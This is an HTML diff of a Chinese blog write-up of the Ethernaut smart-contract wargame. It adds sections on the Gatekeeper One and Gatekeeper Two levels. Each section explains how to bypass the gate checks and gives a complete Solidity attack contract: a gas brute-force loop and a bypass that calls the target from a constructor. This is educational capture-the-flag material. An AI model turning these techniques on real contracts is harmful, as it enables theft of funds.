@@ -19,7 +19,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cauliweak9.github.io/2024/01/21/Ethernaut/Token.png">
 <meta property="article:published_time" content="2024-01-21T00:48:12.000Z">
-<meta property="article:modified_time" content="2024-03-07T08:57:46.532Z">
+<meta property="article:modified_time" content="2024-03-08T17:05:40.346Z">
 <meta property="article:author" content="9C±Void">
 <meta property="article:tag" content="Web3">
 <meta name="twitter:card" content="summary">
@@ -236,7 +236,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">4.5k字</span>
+      <span class="post-count">5.3k字</span>
     </span>
   </span>
 
@@ -245,7 +245,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">17分</span>
+      <span class="post-count">20分</span>
     </span>
   </span>
 </div>
@@ -402,6 +402,29 @@
 <p>具体如何分配的看这个文章：<a target="_blank" rel="noopener" href="https://docs.alchemy.com/docs/smart-contract-storage-layout">What is Smart Contract Storage Layout? (alchemy.com)</a></p>
 <p>然后题目是用了格式转换，把bytes32转为bytes16，其实就是取前半段，后半段舍去，直接unlock就行了，没啥难度</p>
 <p>看storage可以getStorageAt也可以Etherscan直接看合约创建的交易里面状态变量的变化，我懒点就Etherscan了</p>
+<h2 id="Stage-13-Gatekeeper-One"><a href="#Stage-13-Gatekeeper-One" class="headerlink" title="Stage 13    Gatekeeper One"></a>Stage 13    Gatekeeper One</h2><p>我们的第一个4级题目！好耶！</p>
+<p>gateOne还是很容易就能通过的，tx.origin和msg.sender不一致，用合约call就行了</p>
+<p>先跳到gateThree，这个就是uint之间的强制格式转换了，这个还是很简单的，就是忽略高位而已</p>
+<p>那么我们的三个判断式就能这样确认了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint32 == uint16 =&gt; 倒数第2组16位为0，最后一组16位任意</span><br><span class="line">uint32 != uint64 =&gt; 前32位非空，后32位任意</span><br><span class="line">uint32 == uint16(uint160(tx.origin))</span><br><span class="line">	=&gt; tx.origin共40个hex，刚好能转换为uint160，则uint16就是取最后4个hex，比如某人的EOA地址是0x4aE8....9dC7，那么uint16的结果就是0x9dc7的十进制</span><br><span class="line">	=&gt; 倒数第2组16位为0，最后一组16位固定为EOA地址后16位</span><br></pre></td></tr></table></figure>
+
+<p>最后总结一下，其实就可以用EOA地址推出_gateKey：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF;</span><br></pre></td></tr></table></figure>
+
+<p><del>不过我懒得推，这些都是写这关Writeup的时候推的，当时做题是自己输入gateKey的，看代码就知道了（</del></p>
+<p>再回到gateTwo，要求gasleft()能被8191整除，这很难，因为你不知道EVM究竟会用多少gas，所以做这题就只有两个途径：一个是利用Remix的debug自己去看EVM到gasleft()究竟消耗了多少gas，但是这个…有点太麻烦了吧…（而且可能不同EVM分支下消耗的gas数量也不同，比如Remix VM(Shanghai)消耗400+，而Sepolia的EVM消耗200+）</p>
+<p>所以一般就是用第二种方法：爆破. 可以利用call的返回值进行爆破，如果返回值为true就可以打住了</p>
+<p>大致思路有了，那就上攻击合约吧：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Level13.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span>&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="title class_">GatekeeperOne</span> public gatekeeperone;</span><br><span class="line">    uint public count;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _gatekeeperone</span>)&#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">        gatekeeperone = <span class="title class_">GatekeeperOne</span>(_gatekeeperone);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params">bytes8 _gateKey</span>) public&#123;</span><br><span class="line">        <span class="comment">//gatekeeperone.enter&#123;gas: 16798&#125;(_gateKey);</span></span><br><span class="line">        <span class="keyword">for</span>(count=<span class="number">0</span>;count&lt;<span class="number">3000</span>;count++)&#123;</span><br><span class="line">            (bool success,) = <span class="title function_">address</span>(gatekeeperone).<span class="property">call</span>&#123;<span class="attr">gas</span>: count+(<span class="number">8191</span> * <span class="number">3</span>)&#125;(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;enter(bytes8)&quot;</span>, _gateKey));</span><br><span class="line">            <span class="keyword">if</span>(success)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Gatekey = 0x0000 0001 0000 ac00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从攻击合约调用enter就可以通过gateOne，gateTwo的爆破就是for循环，gateThree可以自己用上面推导得到的公式，<del>也可以学我这样（笑）</del></p>
+<h2 id="Stage-14-Gatekeeper-Two"><a href="#Stage-14-Gatekeeper-Two" class="headerlink" title="Stage 14    Gatekeeper Two"></a>Stage 14    Gatekeeper Two</h2><p>水水水！直接杀了！</p>
+<p>gateOne才做过，略过；gateThree就是一个异或运算，如果a⊕b&#x3D;c，则有a⊕c&#x3D;b，b⊕c&#x3D;a，所以我们直接有gateKey等于另两个值的位异或</p>
+<p>gateTwo看起来有点麻烦，但是就是个通过extcodesize判断地址是EOA&#x2F;合约地址，但是由于extcodesize看的是地址保存在链上的bytecode的大小，而合约在constructor的时候并没有把bytecode保存至链上，所以gateTwo可以通过在constructor内调用enter来通过</p>
+<p>最后就得到了这样的攻击合约：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Level14.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span>&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="title class_">GatekeeperTwo</span> public gatekeepertwo;</span><br><span class="line">    bytes8 public _gateKey;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _gatekeepertwo</span>)&#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">        gatekeepertwo = <span class="title class_">GatekeeperTwo</span>(_gatekeepertwo);</span><br><span class="line">        _gateKey = <span class="title function_">bytes8</span>(<span class="title function_">type</span>(uint64).<span class="property">max</span> ^ <span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))))));</span><br><span class="line">        gatekeepertwo.<span class="title function_">enter</span>(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><del>2023的Aurora第一批新生赛的第3题就是改编自这一题，删掉了gateThree</del></p>
 <h2 id="To-be-continued…（正在激情闯关-制作当中-）"><a href="#To-be-continued…（正在激情闯关-制作当中-）" class="headerlink" title="To be continued…（正在激情闯关&#x2F;制作当中~）"></a>To be continued…（正在激情闯关&#x2F;制作当中~）</h2>
     
 
@@ -547,7 +570,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Stage 0    Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">Stage 1    Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">Stage 2    Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Stage 3    Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">Stage 4    Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5-Token"><span class="toc-number">6.</span> <span class="toc-text">Stage 5    Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">Stage 6    Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7-Force"><span class="toc-number">8.</span> <span class="toc-text">Stage 7    Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8-Vault"><span class="toc-number">9.</span> <span class="toc-text">Stage 8    Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9-King"><span class="toc-number">10.</span> <span class="toc-text">Stage 9    King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10-Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Stage 10    Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-11-Elevator"><span class="toc-number">12.</span> <span class="toc-text">Stage 11    Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-12-Privacy"><span class="toc-number">13.</span> <span class="toc-text">Stage 12    Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-be-continued%E2%80%A6%EF%BC%88%E6%AD%A3%E5%9C%A8%E6%BF%80%E6%83%85%E9%97%AF%E5%85%B3-%E5%88%B6%E4%BD%9C%E5%BD%93%E4%B8%AD-%EF%BC%89"><span class="toc-number">14.</span> <span class="toc-text">To be continued…（正在激情闯关&#x2F;制作当中~）</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Stage 0    Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">Stage 1    Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">Stage 2    Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Stage 3    Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">Stage 4    Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5-Token"><span class="toc-number">6.</span> <span class="toc-text">Stage 5    Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">Stage 6    Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7-Force"><span class="toc-number">8.</span> <span class="toc-text">Stage 7    Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8-Vault"><span class="toc-number">9.</span> <span class="toc-text">Stage 8    Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9-King"><span class="toc-number">10.</span> <span class="toc-text">Stage 9    King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10-Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Stage 10    Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-11-Elevator"><span class="toc-number">12.</span> <span class="toc-text">Stage 11    Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-12-Privacy"><span class="toc-number">13.</span> <span class="toc-text">Stage 12    Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-13-Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Stage 13    Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-14-Gatekeeper-Two"><span class="toc-number">15.</span> <span class="toc-text">Stage 14    Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-be-continued%E2%80%A6%EF%BC%88%E6%AD%A3%E5%9C%A8%E6%BF%80%E6%83%85%E9%97%AF%E5%85%B3-%E5%88%B6%E4%BD%9C%E5%BD%93%E4%B8%AD-%EF%BC%89"><span class="toc-number">16.</span> <span class="toc-text">To be continued…（正在激情闯关&#x2F;制作当中~）</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -695,14 +718,6 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随想</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Writeup</a>
               </li>
              
@@ -711,7 +726,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+                <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随想</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -719,15 +738,19 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">GeekChallenge</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
+                <a href="javascript:void(0)" class="js-tag color5">胡思乱想</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">胡思乱想</a>
+                <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
               </li>
             
             <div class="clearfix"></div>
